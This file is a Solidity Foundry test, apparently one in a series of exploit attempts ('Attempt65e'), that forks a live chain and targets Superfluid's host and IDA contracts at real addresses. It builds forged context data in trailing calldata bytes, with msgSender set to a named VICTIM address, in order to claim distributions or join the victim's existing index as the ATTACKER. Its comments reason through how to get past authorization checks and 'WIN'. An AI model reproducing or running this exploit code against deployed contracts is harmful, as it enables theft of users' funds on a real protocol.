// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/// @title Attempt65e: Test whether claim() ctx content affects the outcome
/// @notice If claim() uses ctx fields (like msgSender) for anything meaningful,
///         changing the ctx should change the outcome. We test this by using
///         trailing-bytes to inject different forged ctx values.

interface ISuperfluid {
    function callAgreement(address, bytes calldata, bytes calldata) external returns (bytes memory);
}

interface IIDA {
    function claim(address, address, uint32, address, bytes calldata) external returns (bytes memory);
    function createIndex(address, uint32, bytes calldata) external returns (bytes memory);
    function updateSubscription(address, uint32, address, uint128, bytes calldata) external returns (bytes memory);
    function updateIndex(address, uint32, uint128, bytes calldata) external returns (bytes memory);
    function getSubscription(address, address, uint32, address) external view returns (bool, bool, uint128, uint256);
}

interface IMATICx {
    function balanceOf(address) external view returns (uint256);
    function realtimeBalanceOfNow(address) external view returns (int256, uint256, uint256);
    function upgradeByETH() external payable;
    function downgradeToETH(uint256) external;
}

library CtxLib {
    function encodeCtx(
        uint8 appCallbackLevel, uint8 callType, uint256 timestamp,
        address msgSender, bytes4 agreementSelector, bytes memory userData,
        uint256 appCreditGranted, uint256 appCreditWanted,
        int256 appCreditUsed, address appAddress, address appCreditToken
    ) internal pure returns (bytes memory) {
        uint256 callInfo = uint256(appCallbackLevel) | (uint256(callType) << 32);
        uint256 creditIO = uint256(uint128(appCreditGranted)) |
            (uint256(uint128(appCreditWanted)) << 128);
        return abi.encode(
            abi.encode(callInfo, timestamp, msgSender, agreementSelector, userData),
            abi.encode(creditIO, appCreditUsed, appAddress, appCreditToken)
        );
    }
}

contract Attempt65e_CtxImpact is Test {
    address constant HOST = 0x3E14dC1b13c488a8d5D310918780c983bD5982E7;
    address constant IDA  = 0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1;
    address constant MATICx = 0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3;
    address constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;
    address constant VICTIM = 0xcaB28480ab5c1E133e9B7FC67E030B8DCC2A1d24;

    uint32 constant IDX = 999_222_333;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH5_SUPERFLUID_V2"), 27039967);
    }

    /// @dev Setup: create index, sub, update index
    function _setup() internal {
        vm.deal(ATTACKER, 10 ether);
        vm.startPrank(ATTACKER);
        IMATICx(MATICx).upgradeByETH{value: 5 ether}();

        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSelector(IIDA.createIndex.selector, MATICx, IDX, new bytes(0)),
            ""
        );

        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSelector(IIDA.updateSubscription.selector, MATICx, IDX, VICTIM, uint128(1000), new bytes(0)),
            ""
        );

        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSelector(IIDA.updateIndex.selector, MATICx, IDX, uint128(1e15), new bytes(0)),
            ""
        );

        vm.stopPrank();
    }

    /// @dev Test 1: Normal claim through host - baseline
    function test_1_normal_claim() public {
        _setup();

        (,, uint128 units, uint256 pending) = IIDA(IDA).getSubscription(MATICx, ATTACKER, IDX, VICTIM);
        console.log("units:", units);
        console.log("pending:", pending);

        (int256 victimBefore,,) = IMATICx(MATICx).realtimeBalanceOfNow(VICTIM);
        (int256 atkBefore,,) = IMATICx(MATICx).realtimeBalanceOfNow(ATTACKER);

        vm.prank(ATTACKER);
        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSelector(IIDA.claim.selector, MATICx, ATTACKER, IDX, VICTIM, new bytes(0)),
            ""
        );

        (int256 victimAfter,,) = IMATICx(MATICx).realtimeBalanceOfNow(VICTIM);
        (int256 atkAfter,,) = IMATICx(MATICx).realtimeBalanceOfNow(ATTACKER);
        console.log("victim delta:", victimAfter - victimBefore);
        console.log("atk delta:", atkAfter - atkBefore);
    }

    /// @dev Test 2: Claim with trailing-bytes forged ctx where msgSender = VICTIM
    ///      Compare results with normal claim to see if ctx affects anything
    function test_2_trailing_claim_forged_victim() public {
        _setup();

        bytes memory forgedCtx = CtxLib.encodeCtx(
            0, 1, block.timestamp, VICTIM,
            IIDA.claim.selector, "", 0, 0, 0, address(0), address(0)
        );

        bytes memory innerCalldata = abi.encodeWithSelector(
            IIDA.claim.selector,
            MATICx,
            ATTACKER,
            IDX,
            VICTIM,
            forgedCtx
        );

        bytes memory trailing = abi.encodePacked(innerCalldata, uint256(0x20), uint256(0));

        (int256 victimBefore,,) = IMATICx(MATICx).realtimeBalanceOfNow(VICTIM);
        (int256 atkBefore,,) = IMATICx(MATICx).realtimeBalanceOfNow(ATTACKER);

        vm.prank(ATTACKER);
        try ISuperfluid(HOST).callAgreement(IDA, trailing, "") {
            console.log("TRAILING CLAIM SUCCEEDED!");
            (int256 victimAfter,,) = IMATICx(MATICx).realtimeBalanceOfNow(VICTIM);
            (int256 atkAfter,,) = IMATICx(MATICx).realtimeBalanceOfNow(ATTACKER);
            console.log("victim delta:", victimAfter - victimBefore);
            console.log("atk delta:", atkAfter - atkBefore);
        } catch Error(string memory reason) {
            console.log("FAILED:", reason);
        } catch (bytes memory raw) {
            console.log("FAILED raw len:", raw.length);
            if (raw.length >= 4) {
                bytes4 sel;
                assembly { sel := mload(add(raw, 32)) }
                console.logBytes4(sel);
            }
        }
    }

    /// @dev Test 3: CRITICAL - Can we do claim() but with publisher set to VICTIM
    ///      (not ATTACKER)? We need VICTIM to have an existing index with
    ///      an unapproved subscriber that is us or our contract.
    ///
    ///      The key insight: claim() doesn't have authorizeTokenAccess.
    ///      So anyone can claim for any subscription.
    ///      But the pending distribution goes to the SUBSCRIBER, not the caller.
    ///      So we need to be the subscriber.
    ///
    ///      Can we create a subscription under VICTIM's index for ourselves?
    ///      updateSubscription needs authorizeTokenAccess where publisher = ctx.msgSender
    ///      So we can't add ourselves to VICTIM's index via normal Host flow.
    ///
    ///      BUT: what if we use the TRAILING BYTES trick on updateSubscription?
    ///      We embed a forged ctx with msgSender=VICTIM...
    ///      Wait, updateSubscription HAS authorizeTokenAccess.
    ///      So the IDA would validate the ctx, and our forged ctx fails.
    ///
    ///      UNLESS... the trailing bytes cause the IDA to read the FORGED ctx
    ///      instead of the real ctx? Let's test this!
    function test_3_trailing_updateSubscription() public {
        console.log("=== Test 3: Trailing updateSubscription ===");

        vm.deal(ATTACKER, 10 ether);
        vm.startPrank(ATTACKER);
        IMATICx(MATICx).upgradeByETH{value: 5 ether}();

        // VICTIM already has index 1 on MATICx (REX Market)
        // Try to add ourselves as subscriber using trailing bytes

        // Build forged ctx with msgSender = VICTIM
        bytes memory forgedCtx = CtxLib.encodeCtx(
            0, 1, block.timestamp, VICTIM,
            IIDA.updateSubscription.selector, "", 0, 0, 0, address(0), address(0)
        );

        // updateSubscription(token, indexId, subscriber, units, ctx)
        bytes memory innerCalldata = abi.encodeWithSelector(
            IIDA.updateSubscription.selector,
            MATICx,
            uint32(1),      // VICTIM's existing indexId
            ATTACKER,       // subscriber = us
            uint128(1000),  // units
            forgedCtx       // forged ctx as the ctx parameter
        );

        bytes memory trailing = abi.encodePacked(innerCalldata, uint256(0x20), uint256(0));

        try ISuperfluid(HOST).callAgreement(IDA, trailing, "") {
            console.log("TRAILING updateSubscription SUCCEEDED!");
            (bool exist,,uint128 units,) = IIDA(IDA).getSubscription(MATICx, VICTIM, 1, ATTACKER);
            console.log("sub exists:", exist);
            console.log("sub units:", units);
        } catch Error(string memory reason) {
            console.log("FAILED:", reason);
            // Expected: "invalid ctx" because authorizeTokenAccess validates ctx
            // and the IDA reads the FORGED ctx (not the real one)

            // BUT WAIT: does the IDA read the forged ctx or the real one?
            // After _replacePlaceholderCtx:
            // - The forged ctx is at the offset specified by the standard ABI encoding
            // - The real ctx is appended at the end
            // - The ABI decoder follows the offset to the forged ctx
            // - So "invalid ctx" confirms the IDA reads the FORGED ctx!
            // This means if we can get past authorizeTokenAccess, we WIN.

            if (keccak256(bytes(reason)) == keccak256("invalid ctx")) {
                console.log("CONFIRMED: IDA reads FORGED ctx (not real ctx)!");
                console.log("authorizeTokenAccess catches it with 'invalid ctx'");
                console.log("For claim() which LACKS authorizeTokenAccess,");
                console.log("the forged ctx would be accepted!");
            }
        } catch {
            console.log("FAILED (unknown)");
        }

        vm.stopPrank();
    }

    /// @dev Test 4: What if claim() in the fork uses ctx.msgSender as the
    ///      subscriber instead of the explicit parameter?
    ///      This would be a fork-specific change.
    ///      Test: claim with trailing forged ctx where msgSender=ATTACKER
    ///            but subscriber=some_random_address
    ///      If claim() uses ctx.msgSender, tokens go to ATTACKER.
    ///      If claim() uses the subscriber param, tokens go to random.
    function test_4_claim_ctx_vs_param() public {
        console.log("=== Test 4: Does claim use ctx.msgSender or subscriber param? ===");

        _setup();

        address randomSub = address(0x1234);

        // First add randomSub as subscriber
        vm.prank(ATTACKER);
        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSelector(IIDA.updateSubscription.selector, MATICx, IDX, randomSub, uint128(1), new bytes(0)),
            ""
        );

        // Update index to create pending
        vm.prank(ATTACKER);
        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSelector(IIDA.updateIndex.selector, MATICx, IDX, uint128(2e15), new bytes(0)),
            ""
        );

        // Build trailing claim with forged ctx msgSender=ATTACKER but subscriber=randomSub
        bytes memory forgedCtx = CtxLib.encodeCtx(
            0, 1, block.timestamp, ATTACKER,
            IIDA.claim.selector, "", 0, 0, 0, address(0), address(0)
        );

        bytes memory innerCalldata = abi.encodeWithSelector(
            IIDA.claim.selector,
            MATICx,
            ATTACKER,
            IDX,
            randomSub,  // subscriber = randomSub
            forgedCtx   // ctx.msgSender = ATTACKER
        );

        bytes memory trailing = abi.encodePacked(innerCalldata, uint256(0x20), uint256(0));

        (int256 randomBefore,,) = IMATICx(MATICx).realtimeBalanceOfNow(randomSub);
        (int256 atkBefore,,) = IMATICx(MATICx).realtimeBalanceOfNow(ATTACKER);

        vm.prank(ATTACKER);
        try ISuperfluid(HOST).callAgreement(IDA, trailing, "") {
            console.log("TRAILING CLAIM SUCCEEDED!");
            (int256 randomAfter,,) = IMATICx(MATICx).realtimeBalanceOfNow(randomSub);
            (int256 atkAfter,,) = IMATICx(MATICx).realtimeBalanceOfNow(ATTACKER);
            console.log("random delta:", randomAfter - randomBefore);
            console.log("atk delta:", atkAfter - atkBefore);

            if (atkAfter > atkBefore) {
                console.log("*** CRITICAL: claim() uses ctx.msgSender, not subscriber param! ***");
            } else if (randomAfter > randomBefore) {
                console.log("claim() uses subscriber param (normal behavior)");
            }
        } catch Error(string memory reason) {
            console.log("FAILED:", reason);
        } catch (bytes memory raw) {
            console.log("FAILED raw len:", raw.length);
        }
    }
}
